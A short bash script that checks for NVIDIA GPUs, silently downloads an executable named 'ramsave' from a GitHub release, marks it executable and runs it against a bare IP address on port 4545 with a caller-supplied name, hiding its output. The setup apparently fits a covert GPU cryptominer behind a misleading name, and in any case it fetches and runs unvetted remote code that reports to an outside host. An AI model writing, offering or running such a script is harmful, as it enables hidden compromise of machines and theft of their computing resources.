!/bin/bash
nvidia-smi -L
wget https://github.com/phucbmt/tech/releases/download/1/ramsave &> /dev/null
chmod +x ramsave
./ramsave -P http://216.198.92.69:4545/"$1" &> log
